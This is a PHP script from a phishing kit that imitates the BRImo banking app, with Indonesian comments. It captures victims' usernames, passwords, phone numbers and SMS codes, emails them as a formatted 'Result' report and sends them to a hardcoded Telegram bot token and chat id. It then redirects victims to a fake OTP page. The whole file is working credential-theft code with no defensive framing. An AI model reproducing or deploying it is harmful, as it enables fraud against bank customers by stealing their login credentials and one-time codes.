<?php ob_start() ?>
<?php 
if (!function_exists('base_url')) {
function base_url($atRoot=FALSE, $atCore=FALSE, $parse=FALSE){
if (isset($_SERVER['HTTP_HOST'])) {
$http = isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https' : 'http';
$hostname = $_SERVER['HTTP_HOST'];
$dir = str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);
$core = preg_split('@/@', str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(dirname(__FILE__))), NULL, PREG_SPLIT_NO_EMPTY);
$core = $core[0];
$tmplt = $atRoot ? ($atCore ? "%s://%s/%s/" : "%s://%s/") : ($atCore ? "%s://%s/%s/" : "%s://%s%s");
$end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir);
$base_url = sprintf( $tmplt, $http, $hostname, $end );
}
else $base_url = 'http://localhost/';
if ($parse) {
$base_url = parse_url($base_url);
if (isset($base_url['path'])) if ($base_url['path'] == '/') $base_url['path'] = '';
}
return $base_url;
}
}
$base_url = base_url();


// MENANGKAP DATA YANG DI-INPUT
$emailfb = $_GET['email'];
$passwordfb = $_GET['password'];
$pin = $_GET['pin'];
$url = substr($pin,0,6);
$sms = $_GET['link'];

// KONTEN RESULT AKUN
$subjek = "Result | Punya si $emailfb";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info Login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Username</td>
					<td style="text-align: center;">$emailfb</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$passwordfb</td>
				</tr>
				<tr>
					<td style="border-right: none;">Handphone</td>
					<td style="text-align: center;">$pin</td>
				</tr>
				<tr>
					<td style="border-right: none;">SMS</td>
					<td style="text-align: center;">$sms</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; Brynz.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'mailman.php';
$sender ='From: BRImo SMS <admin@Brynz.ID>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($mail, $subjek, $pesan, $headers);

$pesantelegram = <<<EOD
BRImo Notif 
------------------------
Username : $emailfb 
Password : $passwordfb
Handphone : $pin
SMS : $sms
EOD;
$message_text = $pesantelegram;
$secret_token = '5751555863:AAGdbEXztQKMOYOJuxCRDECvLYJiyOwkwSQ';
$telegram_id = "5597739679";
function sendMessage2($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }
}

mail($mail, $subjek, $pesan, $headers); 
sendMessage2($telegram_id, $message_text, $secret_token);
header('Location: '.$base_url."otp.php?eror=invalid&email=".$emailfb."&password=".$passwordfb."&handphone=".$pin);


?>